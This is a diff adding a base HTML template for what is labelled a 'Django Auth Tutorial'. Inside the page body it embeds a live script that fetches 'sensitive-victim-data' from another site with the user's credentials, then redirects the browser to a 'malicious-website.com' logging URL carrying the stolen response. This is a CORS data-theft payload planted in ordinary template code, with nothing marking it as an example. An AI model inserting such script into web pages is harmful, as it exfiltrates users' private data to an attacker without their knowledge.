@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>{% block title %}Django Auth Tutorial{% endblock %}</title>
+</head>
+<body>
+  <main>
+    <script>
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get','http://vulnerable-website.com/sensitive-victim-data',true);
+      req.withCredentials = true;
+      req.send();
+
+      function reqListener() {
+        location='//malicious-website.com/log?key='+this.responseText;
+        console.dir(req)
+      };
+    </script>
+    {% block content %}
+    {% endblock %}
+  </main>
+</body>
+</html>
